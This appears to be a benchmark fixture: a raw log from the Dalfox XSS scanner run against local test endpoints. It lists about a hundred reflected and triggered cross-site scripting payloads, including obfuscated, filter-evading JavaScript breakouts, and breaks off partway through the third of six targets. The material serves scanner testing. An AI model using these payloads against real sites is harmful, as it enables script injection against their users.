@@ -1,0 +1,499 @@
+
+    _..._
+  .' .::::.   __   _   _    ___ _ __ __
+ :  :::::::: |  \ / \ | |  | __/ \\ V /
+ :  :::::::: | o ) o || |_ | _( o )) (
+ '. '::::::' |__/|_n_||___||_| \_//_n_\
+   '-.::''    
+
+🌙🦊 Dalfox is a powerful open-source XSS scanner and utility focused on automation.
+
+ 🎯  Target                 /root/projects/raijin-xss/bench/fixtures/findings/targets.txt
+ 🏁  Method                 FILE Mode
+ 🖥   Worker                 10
+ 🔦  BAV                    true
+ ⛏   Mining                 true (Gf-Patterns)
+ 🔬  Mining-DOM             true (mining from DOM)
+ ⏱   Timeout                10
+ 📤  FollowRedirect         false
+ 🕰   Started at             2026-10-24 21:00:32.154710944 -0300 -03 m=+0.013772540
+
+ >>>>>>>>>>>>>>>>>>>>>>>>>
+[*] Using file mode(targets list)
+[*] Loaded 6 target urls
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:0][0/6][0.00%%] / URL: http://127.0.0.1:19301/search?q=a
+[*] Valid target [ code:200 / size:103 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 0 testing point in DOM base parameter mining
+[I] Found 1 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)  \  )  (  |  >  `  '  <  "  {  ;  [  ,  -  }  $  =  ]  :  +  .
+    2 line:  <p>You searched for aDalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 420 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 420 queries ]
+[W] Reflected Payload in HTML: q=<ScRipt>print(1)</script>
+    2 line:  <p>You searched for a<ScRipt>print(1)</script></p>
+[W] Reflected Payload in HTML: q="><Svg/onload=alert(1) class=dlafox>
+    2 line:  <p>You searched for a"><Svg/onload=alert(1) class=dlafox></p>
+[V] Triggered XSS Payload (found DOM Object): q=<xmp><p title="</xmp><svg/onload=alert.bind()(1) class=dalfox>
+    2 line:  p>You searched for a<xmp><p title="</xmp><svg/onload=alert.bind()(1) class=dalfo
+[*] [duration: 13.676732575s][issues: 3] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:1][1/6][16.67%%] / URL: http://127.0.0.1:19301/profile?name=a
+[*] Valid target [ code:200 / size:133 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 1 testing point in DOM base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 1 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected name param => PTYPE: URL  Injected: /inATTR-double(1)  <  '  >  `  \  ;  "  -  +  $  |  =  ,  .  :  ]  [  }  )  (  {
+    2 line:  <form><input type="text" name="name" value="aDalFox"></
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 2284 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 2284 queries ]
+[V] Triggered XSS Payload (found DOM Object): name="onpointermove=prompt.apply(null,1) class=dalfox 
+    2 line:  name="name" value="a"onpointermove=prompt.apply(null,1) class=dalfox "></form>
+[*] [duration: 17.405380135s][issues: 1] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:2][2/6][33.33%%] / URL: http://127.0.0.1:19301/widget?cb=a
+[*] Valid target [ code:200 / size:137 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 0 testing point in DOM base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 1 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected cb param => PTYPE: URL  Injected: /inJS-single(1)  "  )  (  ;  `  '  <  >  \  }  {  $  |  :  =  ,  +  -  .  [  ]
+    2 line:  <script>var callback = 'aDalFox'; console.log(callback);</sc
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 1376 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 1376 queries ]
+[W] Reflected Payload in JS: cb=';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])//
+    2 line:  pt>var callback = 'a';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])//';
+[W] Reflected Payload in JS: cb=\'+</scRiPt><sVG/onload=confirm(1)>+'
+    2 line:  pt>var callback = 'a\'+</scRiPt><sVG/onload=confirm(1)>+''; console.log(callback
+[W] Reflected Payload in JS: cb=';window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])//
+    2 line:  pt>var callback = 'a';window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*
+[W] Reflected Payload in JS: cb=\';prompt.apply(null,[1])//
+    2 line:  pt>var callback = 'a\';prompt.apply(null,[1])//'; console.log(callback);</script
+[W] Reflected Payload in JS: cb='+window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])+'
+    2 line:  pt>var callback = 'a'+window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])+'';
+[W] Reflected Payload in JS: cb=\'alert.call(null,1)'
+    2 line:  <script>var callback = 'a\'alert.call(null,1)''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='alert.apply(null,[1])'
+    2 line:  pt>var callback = 'a'alert.apply(null,[1])''; console.log(callback);</script>
+[W] Reflected Payload in HTML: cb='><svg/class='dalfox'onLoad=alert(1)>
+    2 line:  pt>var callback = 'a'><svg/class='dalfox'onLoad=alert(1)>'; console.log(callback
+[W] Reflected Payload in JS: cb=\';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])//
+    2 line:  pt>var callback = 'a\';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])//'
+[W] Reflected Payload in JS: cb='+this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])//
+    2 line:  pt>var callback = 'a'+this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]
+[W] Reflected Payload in JS: cb=\'</sCrIpt><SVg/onload=prompt(1)>'
+    2 line:  pt>var callback = 'a\'</sCrIpt><SVg/onload=prompt(1)>''; console.log(callback);<
+[W] Reflected Payload in JS: cb=\'{{toString().constructor.constructor('alert(1)')()}}'
+    2 line:  pt>var callback = 'a\'{{toString().constructor.constructor('alert(1)')()}}''; co
+[W] Reflected Payload in JS: cb=';</sCrIpt><SVg/onload=prompt(1)>//
+    2 line:  pt>var callback = 'a';</sCrIpt><SVg/onload=prompt(1)>//'; console.log(callback);
+[W] Reflected Payload in JS: cb=\';alert.call(null,1)//
+    2 line:  pt>var callback = 'a\';alert.call(null,1)//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='+{{-function(){this.alert(1)}()}}+'
+    2 line:  pt>var callback = 'a'+{{-function(){this.alert(1)}()}}+''; console.log(callback)
+[W] Reflected Payload in JS: cb=\'+prompt.call(null,1)+'
+    2 line:  pt>var callback = 'a\'+prompt.call(null,1)+''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'alert.apply(null,[1])'
+    2 line:  pt>var callback = 'a\'alert.apply(null,[1])''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\';</ScripT><ScRIpT>prompt(1)</scRIpT>//
+    2 line:  pt>var callback = 'a\';</ScripT><ScRIpT>prompt(1)</scRIpT>//'; console.log(callb
+[W] Reflected Payload in JS: cb=\'+</sCrIpt><SVg/onload=print(1)>//
+    2 line:  pt>var callback = 'a\'+</sCrIpt><SVg/onload=print(1)>//'; console.log(callback);
+[W] Reflected Payload in JS: cb=\';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])//
+    2 line:  pt>var callback = 'a\';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])//'; co
+[W] Reflected Payload in JS: cb='+alert.call(null,1)+'
+    2 line:  pt>var callback = 'a'+alert.call(null,1)+''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='+confirm.apply(null,[1])+'
+    2 line:  pt>var callback = 'a'+confirm.apply(null,[1])+''; console.log(callback);</script
+[W] Reflected Payload in JS: cb=\'{{-function(){this.alert(1)}()}}'
+    2 line:  pt>var callback = 'a\'{{-function(){this.alert(1)}()}}''; console.log(callback);
+[W] Reflected Payload in JS: cb=\'-confirm.call(null,1)-'
+    2 line:  pt>var callback = 'a\'-confirm.call(null,1)-''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+    2 line:  pt>var callback = 'a';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])
+[W] Reflected Payload in JS: cb='confirm(1)'
+    2 line:  <script>var callback = 'a'confirm(1)''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'+alert.call(null,1)+'
+    2 line:  pt>var callback = 'a\'+alert.call(null,1)+''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=';alert(1)//
+    2 line:  <script>var callback = 'a';alert(1)//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'-alert(1)-'
+    2 line:  <script>var callback = 'a\'-alert(1)-''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'+</sCrIpt><SVg/onload=prompt(1)>+'
+    2 line:  pt>var callback = 'a\'+</sCrIpt><SVg/onload=prompt(1)>+''; console.log(callback)
+[W] Reflected Payload in JS: cb=\'+prompt(1)+'
+    2 line:  <script>var callback = 'a\'+prompt(1)+''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='+window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])+'
+    2 line:  pt>var callback = 'a'+window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*
+[W] Reflected Payload in JS: cb='-this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])-'
+    2 line:  pt>var callback = 'a'-this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]
+[W] Reflected Payload in JS: cb='+</sCrIpt><SVg/onload=print(1)>+'
+    2 line:  pt>var callback = 'a'+</sCrIpt><SVg/onload=print(1)>+''; console.log(callback);<
+[W] Reflected Payload in JS: cb=\'+globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);+'
+    2 line:  pt>var callback = 'a\'+globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[]
+[W] Reflected Payload in JS: cb='window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])'
+    2 line:  pt>var callback = 'a'window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])''; c
+[W] Reflected Payload in JS: cb='prompt(1)'
+    2 line:  <script>var callback = 'a'prompt(1)''; console.log(callback);</script>
+[W] Reflected Payload in HTML: cb="><script/"<a"/src=data:=".<a,[].some(confirm)>
+    2 line:  pt>var callback = 'a"><script/"<a"/src=data:=".<a,[].some(confirm)>'; console.lo
+[W] Reflected Payload in JS: cb=';confirm(1)//
+    2 line:  <script>var callback = 'a';confirm(1)//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='-alert.call(null,1)-'
+    2 line:  pt>var callback = 'a'-alert.call(null,1)-''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'+</scRiPt><sVG/onload=confirm(1)>//
+    2 line:  pt>var callback = 'a\'+</scRiPt><sVG/onload=confirm(1)>//'; console.log(callback
+[W] Reflected Payload in JS: cb='-prompt.call(null,1)-'
+    2 line:  pt>var callback = 'a'-prompt.call(null,1)-''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='+self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])+'
+    2 line:  pt>var callback = 'a'+self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+
+[W] Reflected Payload in JS: cb=\'window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])'
+    2 line:  pt>var callback = 'a\'window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*
+[W] Reflected Payload in JS: cb='+confirm(1)//
+    2 line:  <script>var callback = 'a'+confirm(1)//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'print(1)'
+    2 line:  <script>var callback = 'a\'print(1)''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='+</scRiPt><sVG/onload=confirm(1)>+'
+    2 line:  pt>var callback = 'a'+</scRiPt><sVG/onload=confirm(1)>+''; console.log(callback)
+[W] Reflected Payload in JS: cb='+{{-function(){this.alert(1)}()}}//
+    2 line:  pt>var callback = 'a'+{{-function(){this.alert(1)}()}}//'; console.log(callback)
+[W] Reflected Payload in JS: cb=\';confirm.apply(null,[1])//
+    2 line:  pt>var callback = 'a\';confirm.apply(null,[1])//'; console.log(callback);</scrip
+[W] Reflected Payload in JS: cb=\'+print(1)+'
+    2 line:  <script>var callback = 'a\'+print(1)+''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'+</sCRipt><sVg/onload=alert(1)>+'
+    2 line:  pt>var callback = 'a\'+</sCRipt><sVg/onload=alert(1)>+''; console.log(callback);
+[W] Reflected Payload in JS: cb='-</scRipT><sCrIpT>confirm(1)</SCriPt>-'
+    2 line:  pt>var callback = 'a'-</scRipT><sCrIpT>confirm(1)</SCriPt>-''; console.log(callb
+[W] Reflected Payload in JS: cb=\'prompt.call(null,1)'
+    2 line:  pt>var callback = 'a\'prompt.call(null,1)''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='+frames[/al/.source+/ert/.source](/XSS/.source)//
+    2 line:  pt>var callback = 'a'+frames[/al/.source+/ert/.source](/XSS/.source)//'; console
+[W] Reflected Payload in JS: cb=';prompt.call(null,1)//
+    2 line:  pt>var callback = 'a';prompt.call(null,1)//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])'
+    2 line:  pt>var callback = 'a\'this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])''; cons
+[W] Reflected Payload in JS: cb=\'</sCRipt><sVg/onload=alert(1)>'
+    2 line:  pt>var callback = 'a\'</sCRipt><sVg/onload=alert(1)>''; console.log(callback);</
+[W] Reflected Payload in HTML: cb='"><iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></iframe>
+    2 line:  pt>var callback = 'a'"><iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox
+[W] Reflected Payload in JS: cb='+prompt(1)+'
+    2 line:  <script>var callback = 'a'+prompt(1)+''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])'
+    2 line:  pt>var callback = 'a\'self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+
+[W] Reflected Payload in JS: cb='</scRiPt><sVG/onload=confirm(1)>'
+    2 line:  pt>var callback = 'a'</scRiPt><sVG/onload=confirm(1)>''; console.log(callback);<
+[W] Reflected Payload in HTML: cb="><img/src/onerror=.1|alert``>
+    2 line:  pt>var callback = 'a"><img/src/onerror=.1|alert``>'; console.log(callback);</scr
+[W] Reflected Payload in JS: cb=\';</sCrIpt><SVg/onload=print(1)>//
+    2 line:  pt>var callback = 'a\';</sCrIpt><SVg/onload=print(1)>//'; console.log(callback);
+[W] Reflected Payload in JS: cb=\'this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])'
+    2 line:  pt>var callback = 'a\'this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]
+[W] Reflected Payload in HTML: cb='"><img/src/onerror=.1|alert`` class=dalfox>
+    2 line:  pt>var callback = 'a'"><img/src/onerror=.1|alert`` class=dalfox>'; console.log(c
+[W] Reflected Payload in HTML: cb='><img/src/onerror=.1|alert`` class=dalfox>
+    2 line:  pt>var callback = 'a'><img/src/onerror=.1|alert`` class=dalfox>'; console.log(ca
+[W] Reflected Payload in JS: cb='parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])'
+    2 line:  pt>var callback = 'a'parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])''; c
+[W] Reflected Payload in JS: cb=\'+</ScripT><ScRIpT>prompt(1)</scRIpT>+'
+    2 line:  pt>var callback = 'a\'+</ScripT><ScRIpT>prompt(1)</scRIpT>+''; console.log(callb
+[W] Reflected Payload in JS: cb='+</sCriPt><ScRiPt>alert(1)</sCrIpt>//
+    2 line:  pt>var callback = 'a'+</sCriPt><ScRiPt>alert(1)</sCrIpt>//'; console.log(callbac
+[W] Reflected Payload in JS: cb='+self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])+'
+    2 line:  pt>var callback = 'a'+self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/
+[W] Reflected Payload in JS: cb=\';prompt.call(null,1)//
+    2 line:  pt>var callback = 'a\';prompt.call(null,1)//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'+{{-function(){this.alert(1)}()}}//
+    2 line:  pt>var callback = 'a\'+{{-function(){this.alert(1)}()}}//'; console.log(callback
+[W] Reflected Payload in JS: cb='+</scRiPt><sVG/onload=confirm(1)>//
+    2 line:  pt>var callback = 'a'+</scRiPt><sVG/onload=confirm(1)>//'; console.log(callback)
+[W] Reflected Payload in JS: cb=';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])//
+    2 line:  pt>var callback = 'a';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]
+[W] Reflected Payload in JS: cb=';alert.apply(null,[1])//
+    2 line:  pt>var callback = 'a';alert.apply(null,[1])//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='-{{toString().constructor.constructor('alert(1)')()}}-'
+    2 line:  pt>var callback = 'a'-{{toString().constructor.constructor('alert(1)')()}}-''; c
+[W] Reflected Payload in JS: cb='+</ScripT><ScRIpT>prompt(1)</scRIpT>+'
+    2 line:  pt>var callback = 'a'+</ScripT><ScRIpT>prompt(1)</scRIpT>+''; console.log(callba
+[W] Reflected Payload in JS: cb=\'+self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])//
+    2 line:  pt>var callback = 'a\'+self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*
+[W] Reflected Payload in JS: cb='-confirm.apply(null,[1])-'
+    2 line:  pt>var callback = 'a'-confirm.apply(null,[1])-''; console.log(callback);</script
+[W] Reflected Payload in JS: cb='</sCriPt><ScRiPt>alert(1)</sCrIpt>'
+    2 line:  pt>var callback = 'a'</sCriPt><ScRiPt>alert(1)</sCrIpt>''; console.log(callback)
+[W] Reflected Payload in JS: cb='</sCRipt><sVg/onload=alert(1)>'
+    2 line:  pt>var callback = 'a'</sCRipt><sVg/onload=alert(1)>''; console.log(callback);</s
+[W] Reflected Payload in JS: cb='this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])'
+    2 line:  pt>var callback = 'a'this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])''; conso
+[W] Reflected Payload in HTML: cb='><img/src/onerror=.1|alert``>
+    2 line:  pt>var callback = 'a'><img/src/onerror=.1|alert``>'; console.log(callback);</scr
+[W] Reflected Payload in JS: cb=\'+self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])//
+    2 line:  pt>var callback = 'a\'+self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]
+[W] Reflected Payload in JS: cb='+alert.call(null,1)//
+    2 line:  pt>var callback = 'a'+alert.call(null,1)//'; console.log(callback);</script>
+[W] Reflected Payload in HTML: cb='><sVg/onload=alert(1) class=dalfox>
+    2 line:  pt>var callback = 'a'><sVg/onload=alert(1) class=dalfox>'; console.log(callback)
+[W] Reflected Payload in JS: cb=\';{{toString().constructor.constructor('alert(1)')()}}//
+    2 line:  pt>var callback = 'a\';{{toString().constructor.constructor('alert(1)')()}}//'; 
+[W] Reflected Payload in JS: cb='alert(1)'
+    2 line:  <script>var callback = 'a'alert(1)''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'+{{-function(){this.alert(1)}()}}+'
+    2 line:  pt>var callback = 'a\'+{{-function(){this.alert(1)}()}}+''; console.log(callback
+[W] Reflected Payload in HTML: cb="><Svg/onload=alert(1) class=dlafox>
+    2 line:  pt>var callback = 'a"><Svg/onload=alert(1) class=dlafox>'; console.log(callback)
+[W] Reflected Payload in JS: cb=\'-frames[/al/.source+/ert/.source](/XSS/.source)-'
+    2 line:  pt>var callback = 'a\'-frames[/al/.source+/ert/.source](/XSS/.source)-''; consol
+[W] Reflected Payload in HTML: cb="><svg/class="dalfox"onLoad=alert(1)>
+    2 line:  pt>var callback = 'a"><svg/class="dalfox"onLoad=alert(1)>'; console.log(callback
+[W] Reflected Payload in JS: cb=\'-window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])-'
+    2 line:  pt>var callback = 'a\'-window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/
+[W] Reflected Payload in JS: cb=\'+this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])+'
+    2 line:  pt>var callback = 'a\'+this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])+''; co
+[W] Reflected Payload in HTML: cb="><a href="javascript&colon;alert(1)">click
+    2 line:  pt>var callback = 'a"><a href="javascript&colon;alert(1)">click'; console.log(ca
+[W] Reflected Payload in JS: cb=\'self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])'
+    2 line:  pt>var callback = 'a\'self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/
+[W] Reflected Payload in JS: cb=\'</sCrIpt><SVg/onload=print(1)>'
+    2 line:  pt>var callback = 'a\'</sCrIpt><SVg/onload=print(1)>''; console.log(callback);</
+[W] Reflected Payload in JS: cb=\'+window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])+'
+    2 line:  pt>var callback = 'a\'+window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])+''
+[W] Reflected Payload in JS: cb=\'+window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])//
+    2 line:  pt>var callback = 'a\'+window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])//'
+[W] Reflected Payload in JS: cb=\'+alert(1)//
+    2 line:  <script>var callback = 'a\'+alert(1)//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='-prompt.apply(null,[1])-'
+    2 line:  pt>var callback = 'a'-prompt.apply(null,[1])-''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'+</ScripT><ScRIpT>prompt(1)</scRIpT>//
+    2 line:  pt>var callback = 'a\'+</ScripT><ScRIpT>prompt(1)</scRIpT>//'; console.log(callb
+[W] Reflected Payload in JS: cb='+alert.apply(null,[1])//
+    2 line:  pt>var callback = 'a'+alert.apply(null,[1])//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'+alert.apply(null,[1])//
+    2 line:  pt>var callback = 'a\'+alert.apply(null,[1])//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'+top[/al/.source+/ert/.source](/XSS/.source)//
+    2 line:  pt>var callback = 'a\'+top[/al/.source+/ert/.source](/XSS/.source)//'; console.l
+[W] Reflected Payload in JS: cb='+parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])//
+    2 line:  pt>var callback = 'a'+parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])//';
+[W] Reflected Payload in JS: cb=';{{-function(){this.alert(1)}()}}//
+    2 line:  pt>var callback = 'a';{{-function(){this.alert(1)}()}}//'; console.log(callback)
+[W] Reflected Payload in JS: cb='-this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])-'
+    2 line:  pt>var callback = 'a'-this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]
+[W] Reflected Payload in JS: cb=\'+{{toString().constructor.constructor('alert(1)')()}}+'
+    2 line:  pt>var callback = 'a\'+{{toString().constructor.constructor('alert(1)')()}}+''; 
+[W] Reflected Payload in JS: cb=';</sCriPt><ScRiPt>alert(1)</sCrIpt>//
+    2 line:  pt>var callback = 'a';</sCriPt><ScRiPt>alert(1)</sCrIpt>//'; console.log(callbac
+[W] Reflected Payload in JS: cb='+</ScripT><ScRIpT>print(1)</scRIpT>+'
+    2 line:  pt>var callback = 'a'+</ScripT><ScRIpT>print(1)</scRIpT>+''; console.log(callbac
+[W] Reflected Payload in JS: cb=\'-alert.apply(null,[1])-'
+    2 line:  pt>var callback = 'a\'-alert.apply(null,[1])-''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'</scRipT><sCrIpT>confirm(1)</SCriPt>'
+    2 line:  pt>var callback = 'a\'</scRipT><sCrIpT>confirm(1)</SCriPt>''; console.log(callba
+[W] Reflected Payload in JS: cb=\';frames[/al/.source+/ert/.source](/XSS/.source)//
+    2 line:  pt>var callback = 'a\';frames[/al/.source+/ert/.source](/XSS/.source)//'; consol
+[W] Reflected Payload in JS: cb=\';alert(1)//
+    2 line:  <script>var callback = 'a\';alert(1)//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])//
+    2 line:  pt>var callback = 'a';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+
+[W] Reflected Payload in JS: cb='-alert.apply(null,[1])-'
+    2 line:  pt>var callback = 'a'-alert.apply(null,[1])-''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'-prompt(1)-'
+    2 line:  <script>var callback = 'a\'-prompt(1)-''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='+alert(1)+'
+    2 line:  <script>var callback = 'a'+alert(1)+''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'+confirm.apply(null,[1])+'
+    2 line:  pt>var callback = 'a\'+confirm.apply(null,[1])+''; console.log(callback);</scrip
+[W] Reflected Payload in JS: cb=\'+print(1)//
+    2 line:  <script>var callback = 'a\'+print(1)//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='frames[/al/.source+/ert/.source](/XSS/.source)'
+    2 line:  pt>var callback = 'a'frames[/al/.source+/ert/.source](/XSS/.source)''; console.l
+[W] Reflected Payload in JS: cb='-globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);-'
+    2 line:  pt>var callback = 'a'-globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])
+[W] Reflected Payload in JS: cb=';frames[/al/.source+/ert/.source](/XSS/.source)//
+    2 line:  pt>var callback = 'a';frames[/al/.source+/ert/.source](/XSS/.source)//'; console
+[W] Reflected Payload in JS: cb='window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])'
+    2 line:  pt>var callback = 'a'window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*b
+[W] Reflected Payload in JS: cb=\'-print(1)-'
+    2 line:  <script>var callback = 'a\'-print(1)-''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'+alert.apply(null,[1])+'
+    2 line:  pt>var callback = 'a\'+alert.apply(null,[1])+''; console.log(callback);</script>
+[W] Reflected Payload in JS: cb=\'+alert.call(null,1)//
+    2 line:  pt>var callback = 'a\'+alert.call(null,1)//'; console.log(callback);</script>
+[W] Reflected Payload in JS: cb='+</sCrIpt><SVg/onload=prompt(1)>//
+    2 line:  pt>var callback = 'a'+</sCrIpt><SVg/onload=prompt(1)>//'; console.log(callback);
+[W] Reflected Payload in JS: cb='+{{toString().constructor.constructor('alert(1)')()}}//
+    2 line:  pt>var callback = 'a'+{{toString().constructor.constructor('alert(1)')()}}//'; c
+[W] Reflected Payload in JS: cb=\'+frames[/al/.source+/ert/.source](/XSS/.source)//
+    2 line:  pt>var callback = 'a\'+frames[/al/.source+/ert/.source](/XSS/.source)//'; consol
+[W] Reflected Payload in JS: cb=\'parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])'
+    2 line:  pt>var callback = 'a\'parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])''; 
